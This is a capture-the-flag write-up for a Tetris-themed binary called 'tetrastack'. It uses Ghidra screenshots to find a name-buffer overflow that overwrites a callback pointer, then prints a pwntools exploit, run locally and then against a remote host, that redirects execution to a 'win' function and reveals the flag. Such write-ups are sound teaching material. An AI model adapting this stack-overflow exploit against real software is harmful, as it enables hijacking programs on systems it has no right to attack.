# tetrastack
### Description: We don't trust proprietary solutions, so we made our own tetris

- A tetris type challenge.
- Let's inspect the file with Ghidra
- ![main](https://i.imgur.com/ZLkWJb9.png)
- ![menu](https://i.imgur.com/BtE6wxw.png)
- ![win_function](https://i.imgur.com/vS2YE8n.png)
- We can see that is initing some variables like: ``callbacks, player, board``.
- I think we can see the issue right from ghidra
```
struct Callbacks
{
  cb_t on_gameover; // Address to call on quit
  cb_t on_lineclear
}
```

```
struct Player
{
  char* name; // PAYLOAD
  size_t name_cap;
}
```
- ![call_pointer](https://i.imgur.com/Kk5nm3r.png)
- ![stack_of_pointers](https://i.imgur.com/moQwBLy.png)
- So we can see that if we overflow the Player's name we can manage to call our ``payload`` to redirect the flow to function ``win``.

- We didn't search much, but after we got some key elements we executed the file and test it out
- ![menu_of_exe](https://i.imgur.com/0icjkns.png)
- Let's spam option 1 to call ``gameover``
- ![gameover_typename](https://i.imgur.com/QHSNnif.png)
- After ``gameover`` is called we need to type a ``name`` and ``length`` of the name. Bingo! here we can do our stuff.
- We created a ``python`` script with ``pwntools``
```
from pwn import *
import time
elf=ELF("./tetrastack2")
rop=ROP(elf)
p = process("./tetrastack2")
win=elf.symbols['win']
OFFSET=72
ret=rop.ret.address

payload=b"A" * OFFSET + p64(0) + p64(win)

while not p.recvuntil(b"Please enter your name for the leaderboard:",timeout=0.01):
		p.sendline(b"1")
		time.sleep(0.1)

p.recvuntil(b"Enter display name length:")
p.sendline(str(len(payload)).encode())
p.recvuntil(b"Enter display name bytes:")
p.sendline(payload)
p.sendline(b"8")
p.interactive()
```
- Let's run it locally to check if it works or not
- ![local](https://i.imgur.com/kVSyX0F.png)
- WORKS! Let's see if it works on their machine
```
from pwn import *
import time
elf=ELF("./tetrastack2")
rop=ROP(elf)
p=remote("HOST", PORT)
#p = process("./tetrastack2")
win=elf.symbols['win']
OFFSET=72
ret=rop.ret.address

payload=b"A" * OFFSET + p64(0) + p64(win)

while not p.recvuntil(b"Please enter your name for the leaderboard:",timeout=0.01):
		p.sendline(b"1")
		time.sleep(0.1)

p.recvuntil(b"Enter display name length:")
p.sendline(str(len(payload)).encode())
p.recvuntil(b"Enter display name bytes:")
p.sendline(payload)
p.sendline(b"8")
p.interactive()
```
- ![nc](https://i.imgur.com/X8D5hzY.png)
- GG!
```
CTF{43e406a17215dac76a25fc794b016d35c8b6f7e8a0f3aa46283d5167b3a5f09d}
```
